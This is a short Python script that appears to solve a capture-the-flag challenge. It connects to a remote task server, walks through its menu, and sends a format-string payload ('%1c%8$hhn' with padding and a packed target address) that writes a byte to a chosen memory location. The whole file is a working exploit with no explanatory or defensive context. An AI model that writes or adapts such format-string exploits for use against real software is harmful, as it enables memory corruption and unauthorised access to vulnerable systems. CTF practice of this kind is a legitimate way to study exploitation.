import socket
import struct
import time

s = socket.create_connection(("tasks.duckerz.ru", 30011))

payload = b"%1c%8$hhn" + b"A" * 7 + struct.pack("<Q", 0x404089)

print(s.recv(4096).decode("utf-8", errors="replace"))

s.sendall(b"2\n")
time.sleep(0.2)
print(s.recv(4096).decode("utf-8", errors="replace"))

s.sendall(payload + b"\n")
time.sleep(0.2)
print(s.recv(4096).decode("utf-8", errors="replace"))

s.sendall(b"123\n")
time.sleep(0.2)
print(s.recv(4096).decode("utf-8", errors="replace"))

s.sendall(b"3\n")
time.sleep(0.5)
print(s.recv(8192).decode("utf-8", errors="replace"))

s.close()